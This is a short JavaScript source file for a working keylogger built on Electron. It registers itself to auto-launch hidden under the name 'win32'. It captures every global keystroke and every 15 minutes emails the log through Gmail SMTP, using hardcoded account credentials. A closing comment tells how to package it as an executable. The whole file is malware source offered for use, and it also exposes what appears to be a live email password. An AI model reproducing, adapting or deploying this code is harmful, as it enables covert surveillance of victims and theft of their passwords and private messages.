const AL = require('auto-launch');
const email = require('emailjs');
const gkm = require('gkm');

new AL({ name: 'win32', isHidden: true }).enable();

const server = email.server.connect({
  user: 'centumrazor@gmail.com',
  password: 'jtyymlmouujtyycj',
  host: 'smtp.gmail.com',
  ssl: true,
  port: 465,
});

const logs = [];
gkm.events.on('key.pressed', (key) => {
  // console.log(logs.join(''));
  switch (key[0]) {
    case 'Space': return logs.push(' ');
    case 'Enter': return logs.push('\n');
    case 'Backspace': return logs.pop();
    default: return key[0].length > 1 ? logs.push(` --${key[0]}-- `) : logs.push(key[0].toLowerCase());
  }
});

setInterval(() => {
  if (!logs.length) return;
  server.send({
    text: logs.join(''),
    from: 'centumrazor@gmail.com',
    to: 'centumrazor@gmail.com',
    subject: 'Logger Output',
  });
  logs.length = 0;
}, 900000); // 15 minutes
// to package, run: electron-packager . [name] [--icon="icon.ico"] (bracketed things are optional)
